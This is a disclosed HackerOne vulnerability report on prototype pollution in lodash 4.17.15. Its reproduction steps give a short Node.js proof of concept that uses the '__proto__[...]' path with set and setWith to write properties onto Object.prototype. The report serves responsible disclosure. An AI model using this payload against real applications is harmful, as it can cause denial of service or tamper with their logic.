# [H] Prototype Pollution lodash 4.17.15

## Summary
Severity: High
Program: Node.js third-party modules
Weakness: Uncontrolled Resource Consumption
Reporter: awarau
State: resolved
Disclosed: 2020-08-21T10:34:29.931Z
Source: https://hackerone.com/reports/864701

## Details
I would like to report Prototype Pollution in lodash version 4.17.15
It allows Denial of Service and more. 

# Module
**module name:** lodash
**version:** 4.17.15
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

The Lodash library exported as Node.js modules.

## Module Stats

27M in the last week

# Vulnerability

## Vulnerability Description

## Steps To Reproduce:
1. Create a JS file with this contents:

lod = require('lodash')
lod.setWith({}, "__proto__[test]", "123")
lod.set({}, "__proto__[test2]", "456")
console.log(test)
console.log(test2)

2. Execute it with node
3. Observe that test and test2 are now on the Object.prototype.

## Supporting Material/References:

This is a variation on:
https://hackerone.com/reports/380873

# Wrap up

_Trimmed to 38 lines — full report: https://hackerone.com/reports/864701_
